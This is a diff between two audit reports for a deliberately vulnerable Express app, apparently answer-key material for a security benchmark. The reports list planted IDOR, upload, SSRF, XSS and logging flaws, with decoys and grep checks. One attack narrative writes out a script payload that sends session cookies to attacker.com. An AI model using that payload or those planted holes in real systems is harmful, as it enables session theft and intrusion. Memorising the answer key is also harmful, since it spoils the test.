@@ -1,87 +1,117 @@
-# Audit Report: app-15 — Digital Asset Management
+# Security Report: app-15-digital-assets
 
-**Language:** TypeScript (Express)  
-**Business Domain:** Digital Asset / File Management  
-**Date:** 2026-05-24
+## Application Information
 
----
-
-## Standalone Vulnerabilities
-
-### VULN-01: A01 — Broken Access Control (IDOR)
-
-**Severity:** High  
-**Location:** `src/index.ts:135-156` — `GET /api/assets/:id`  
-**Lines:**
-```typescript
-// VULNERABILITY A01: Broken Access Control (IDOR)
-```
-
-**Difficulty: EASY**
-
-- Asset detail endpoint returns file metadata and download URLs by ID
-- No check verifying requesting user owns the private asset (`is_public = 0`)
-- Any authenticated user can view any asset's details and download link
-
-### VULN-02: A08 — Software and Data Integrity Failures (Unrestricted File Upload)
-
-**Severity:** High  
-**Location:** `src/index.ts:90-100` / `src/index.ts:158-182` — Multer config + `POST /api/assets/upload`  
-**Lines:**
-```typescript
-// VULNERABILITY A08: Unrestricted File Upload
-```
-
-**Difficulty: MEDIUM**
-
-- Multer disk storage writes files to public `/uploads` directory
-- Original filename preserved directly with no extension validation
-- Allows uploading executable files (`.js`, `.html`, `.jsp`, etc.)
-
-### VULN-03: A10 — Server-Side Request Forgery (SSRF)
-
-**Severity:** Medium  
-**Location:** `src/index.ts:184-228` — `POST /api/assets/import`  
-**Lines:**
-```typescript
-// VULNERABILITY A10: Server-Side Request Forgery (SSRF)
-```
-
-**Difficulty: MEDIUM**
-
-- Import endpoint fetches content from user-supplied URL with no validation
-- No block on loopback, private, or internal IP ranges
-- Response content is written directly to the public uploads directory
+- **App ID**: app-15
+- **App Name**: Digital Assets Manager
+- **Language**: TypeScript
+- **Framework**: Express
+- **Source**: `apps/typescript/app-15-digital-assets/`
 
 ---
 
-## Chained Attack: chain-01
+## Vulnerability Summary
 
-**Chain Name:** SSRF → Unrestricted File Write → Lateral Movement / RCE  
-**Combined Impact:** Lateral Movement  
-**Overall Chain Difficulty: MEDIUM-HARD**
+| ID | OWASP | Category | Severity | Location | CWE |
+|---|---|---|---|---|---|
+| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/portfolios/:id` (lines 156-170) | CWE-639 |
+| V2 | A03 | Injection | High | `src/index.ts` → `GET /api/assets/search` (lines 173-185) | CWE-79 |
+| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `POST /api/admin/portfolios/:id/delete` (lines 192-208) | CWE-778 |
 
-### Link 1: SSRF on Import Endpoint (A10 — Medium)
+### V1: IDOR on Portfolio Details
 
-**Difficulty: MEDIUM**
+**OWASP Category**: A01 — Broken Access Control
 
-- Fetches arbitrary user-supplied URL via native `fetch()`
-- Attacker can target internal services (e.g., cloud metadata `http://169.254.169.254/`, internal dashboards)
-- Also allows fetching content from attacker-controlled external hosts
+**Description**: Viewing digital asset portfolio details by ID lacks verification of user ownership, allowing any authenticated user to retrieve details of another investor's portfolio.
 
-### Link 2: Unrestricted File Write into Web Root (A08 — Medium)
+**Endpoint**: `GET /api/portfolios/:id`
 
-**Difficulty: EASY**
+**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
 
-- Downloaded content is written to public `/uploads` directory with user-specified filename
-- No extension validation — `.js`, `.html`, or script files can be uploaded
-- Can be executed by requesting `http://localhost:8015/uploads/malicious.js`
-- Combined with SSRF, attacker can exfiltrate internal service data and then execute remote scripts
+**Impact**: Medium — Any authenticated user can enumerate portfolio IDs to view sensitive asset holdings, valuations, and transaction history.
+
+**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.id` against the portfolio's owner ID.
 
 ---
 
-## Summary
+### V2: Stored XSS in Asset Search Results
 
-App-15 is a TypeScript Express digital asset management system with an IDOR exposing private files, unrestricted file upload enabling RCE, and SSRF enabling internal network probing. Chain: SSRF → unrestricted file write into web root → lateral movement or RCE.
+**OWASP Category**: A03 — Injection
 
-**Overall Difficulty Score:** 3/5 (Medium)
+**Description**: Asset descriptions are rendered in search results without HTML encoding, enabling stored cross-site scripting.
+
+**Endpoint**: `GET /api/assets/search`
+
+**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+
+**Impact**: High — An attacker can inject malicious JavaScript in an asset description field. When other users search for or view that asset, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.
+
+**Detection**: Look for asset description fields being served as raw HTML strings in API responses and rendered client-side with `innerHTML` or similar without sanitization.
+
+---
+
+### V3: Missing Audit Log on Portfolio Deletion
+
+**OWASP Category**: A09 — Security Logging and Monitoring Failures
+
+**Description**: Deleting investment portfolios from the system produces no audit logs, blindfolding administrators to record destruction.
+
+**Endpoint**: `POST /api/admin/portfolios/:id/delete`
+
+**CWE**: CWE-778 (Insufficient Logging)
+
+**Impact**: Low — Malicious or accidental deletion of portfolio records cannot be traced or investigated.
+
+**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.
+
+---
+
+## Chained Attack Scenario
+
+### Chain: "Stored XSS Portfolio Malware → Asset Portfolio IDOR Exfiltration"
+
+**Impact**: `account_takeover`
+
+**Overview**: An attacker embeds a malicious script in an asset description, which steals a portfolio manager's session when they view search results. The attacker then uses the session to exfiltrate other users' portfolio data via IDOR.
+
+**Components**:
+
+| Step | Issue | Severity | OWASP | CWE | Location |
+|---|---|---|---|---|---|
+| 1 | Stored XSS in asset descriptions enables session cookie theft | Medium | A03 | CWE-79 | `GET /api/assets/search` |
+| 2 | Portfolio detail endpoint permits IDOR exfiltration of sensitive holdings | Medium | A01 | CWE-639 | `GET /api/portfolios/:id` |
+
+**Attack Narrative**:
+1. The attacker posts an asset with a description containing a malicious JavaScript payload: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
+2. When a portfolio manager searches for assets via `GET /api/assets/search`, the XSS payload executes in their browser, exfiltrating their session cookie to the attacker.
+3. Using the hijacked session, the attacker queries `GET /api/portfolios/3` through IDOR to retrieve detailed portfolio data from other investors.
+
+**Combined Impact**: Account takeover — An attacker can steal admin sessions and exfiltrate sensitive portfolio data by chaining stored XSS with IDOR.
+
+---
+
+## Decoys (False-Positive Candidates)
+
+| Location | Description |
+|---|---|
+| `src/index.ts` | Proper parameterized query logic in `POST /api/portfolios/create` to create new portfolios safely |
+| `src/index.ts` | Proper Bcrypt hashing for password storage and validation |
+
+---
+
+## Detection Commands
+
+```bash
+# Find IDOR on portfolio details
+grep -n "portfolios.*:id\|findOne\|findById" apps/typescript/app-15-digital-assets/src/index.ts
+
+# Find XSS in asset search
+grep -n "search\|innerHTML\|res\.send\|escape\|sanitize" apps/typescript/app-15-digital-assets/src/index.ts
+
+# Find missing audit logs on deletion
+grep -n "delete\|remove\|log\|audit" apps/typescript/app-15-digital-assets/src/index.ts
+```
+
+---
+
+*Report generated from `.vulns` manifest for app-15-digital-assets*
